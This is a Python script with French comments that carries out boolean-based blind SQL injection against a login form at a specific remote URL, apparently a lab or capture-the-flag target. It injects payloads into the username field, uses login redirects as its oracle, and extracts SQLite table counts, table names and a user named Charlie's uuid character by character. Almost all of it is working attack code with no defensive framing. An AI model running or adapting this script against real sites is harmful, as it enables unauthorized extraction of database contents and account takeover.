import requests

# Pour connaître le nombre de tables
def get_table_number(url):
    counter = 0
    while True:
        payload = f"' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table')={counter} --&"
        data = {f"username": payload,"password": "aa"}
        response = requests.post(url, data=data)
        if response.history:
            break
        else:
            # print(f"❌ {counter} is not the good number of tables")
            counter += 1
    print(f"✅ There is {counter} table(s)")
    return counter

def extract_table_name(url, table_count):
    all_table_names = []
    for i in range(table_count): # Itère sur chaque table
        character_index = 1
        temp_table_name = ''
        finished = False
        while finished == False : # Itère sur tous les charactères du nom
            for char_code in range(32, 127): # Itère sur tous les caractères imprimables
                payload = f"' OR (SELECT SUBSTR(name,{character_index},1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i})='{chr(char_code)}' --"
                data = {f"username": payload,"password": "aa"}
                response = requests.post(url, data=data)
                if response.history:
                    temp_table_name += chr(char_code)
                    print(f"Temporary name is : {temp_table_name}")
                    character_index += 1
                    break
                elif not response.history and char_code == 126:
                    print(f"Nothing return TRUE, so the name is complet : {temp_table_name}")
                    all_table_names.append(temp_table_name)
                    finished = True
                    break
    print(f"Table(s) name(s) : {all_table_names}")
    return all_table_names

def extract_uuid(url):
    # ' OR (SELECT SUBSTR(uuid,1,1) FROM users WHERE username='Charlie')='5' --
    all_table_names = []
    character_index = 1
    temp_table_name = ''
    finished = False
    while finished == False : # Itère sur tous les charactères du nom
        for char_code in range(32, 127): # Itère sur tous les caractères imprimables
            payload = f"' OR (SELECT SUBSTR(uuid,{character_index},1) FROM users WHERE username='Charlie')='{chr(char_code)}' --"
            data = {f"username": payload,"password": "aa"}
            response = requests.post(url, data=data)
            if response.history:
                temp_table_name += chr(char_code)
                print(f"Temporary name is : {temp_table_name}")
                character_index += 1
                break
            elif not response.history and char_code == 126:
                print(f"Nothing return TRUE, so the name is complet : {temp_table_name}")
                all_table_names.append(temp_table_name)
                finished = True
                break
    print(f"Table(s) name(s) : {all_table_names}")
    return all_table_names

if __name__ == '__main__':
    url = "http://thermostat.labossi.xyz:32826/very-annoying-path-for-admin-login"
    # table_count = get_table_number(url)
    # table_names = extract_table_name(url, table_count)
    print(extract_uuid(url))
